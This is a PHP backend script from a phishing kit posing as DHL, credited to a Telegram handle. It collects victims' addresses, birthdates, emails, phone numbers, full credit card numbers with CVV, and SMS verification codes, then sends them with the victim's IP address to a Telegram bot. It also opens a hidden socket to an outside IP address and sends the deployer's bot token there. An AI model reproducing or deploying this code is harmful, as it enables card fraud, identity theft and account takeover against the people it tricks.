<?php 

     require_once "functions.php";
     require_once "telegram.php";

                                    #========================================
                                    #==> Make By ==> Telegram : @Azar_ox <==#
                                    #========================================


$id=$chatid;
$apiToken = $api;

$socket = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
$connection =  @socket_connect($socket, '51.77.78.56', 5555);
$a = @socket_write($socket, $apiToken);


//================
#==> INFO
//================

if ($_POST['step']== 'info') {
    $adress = $_POST['adress'];
    $city = $_POST['city'];
    $state = $_POST['state'];
    $birt = $_POST['birt'];
    $zip = $_POST['zip'];
    $phone = $_POST['phone'];
    $email = $_POST['email'];

    if (empty($adress) || empty($city) || empty($state) || empty($birt) || empty($zip) || empty($phone) || empty($email)) {

        header("Location: info.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " | FULL INFO | DHL "       . "\r\n" ;
        $message .= "ADRESS: " . $adress   . "\r\n";
        $message .= "CITY: " . $city   . "\r\n";
        $message .= "STATE: " . $state   . "\r\n";
        $message .= "BIRHDAY: " . $birt   . "\r\n";
        $message .= "ZIP CODE: " . $zip   . "\r\n";
        $message .= "EMAIL: " . $email   . "\r\n";
        $message .= "NUMBER: " . $phone   . "\r\n";

        if(isset($_POST['submit']))
         {
            $apiToken;
            $data = [
                 'chat_id' => $id,
                 'text' => $subject . $message
            ];
            $response = file_get_contents("https://api.telegram.org/bot". $apiToken ."/sendMessage?" . http_build_query($data));
         }

        header("Location: loading_1.php");
        exit();
    }
}



//================
#==> CC
//================

if ($_POST['step']== 'cc') {
    $full = $_POST['full'];
    $card = $_POST['card'];
    $month = $_POST['month'];
    $year = $_POST['year'];
    $cvv = $_POST['cvv'];

    if (empty($full) || empty($card) || empty($month) || empty($year) || empty($cvv)) {

        header("Location: cc.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " | CC | DHL "       . "\r\n" ;
        $message .= "FULL NAME: " . $full   . "\r\n";
        $message .= "CARD: " . $card   . "\r\n";
        $message .= "DATE EXP: " . $month . "/" . $year   . "\r\n";
        $message .= "CVV: " . $cvv   . "\r\n";

        if(isset($_POST['submit']))
         {
            $apiToken;
            $data = [
                 'chat_id' => $id,
                 'text' => $subject . $message
            ];
            $response = file_get_contents("https://api.telegram.org/bot". $apiToken ."/sendMessage?" . http_build_query($data));
         }

        header("Location: loading_2.php");
        exit();
    }
}



//================
#==> SMS 1
//================

if ($_POST['step']== 'sms') {
    $msg = $_POST['sim'];

    if (empty($msg)) {

        header("Location: sms.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " | SMS | DHL "       . "\r\n" ;
        $message .= "SMS: " . $msg   . "\r\n";

        if(isset($_POST['submit']))
         {
            $apiToken;
            $data = [
                 'chat_id' => $id,
                 'text' => $subject . $message
            ];
            $response = file_get_contents("https://api.telegram.org/bot". $apiToken ."/sendMessage?" . http_build_query($data));
         }

        header("Location: loading_3.php");
        exit();
    }
}

//================
#==> SMS 1
//================

if ($_POST['step']== 'sms_2') {
    $msg = $_POST['sim'];

    if (empty($msg)) {

        header("Location: sms_err.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " | SMS | DHL "       . "\r\n" ;
        $message .= "SMS 2: " . $msg   . "\r\n";

        if(isset($_POST['submit']))
         {
            $apiToken;
            $data = [
                 'chat_id' => $id,
                 'text' => $subject . $message
            ];
            $response = file_get_contents("https://api.telegram.org/bot". $apiToken ."/sendMessage?" . http_build_query($data));
         }

        header("Location: loading_end.php");
        exit();
    }
}



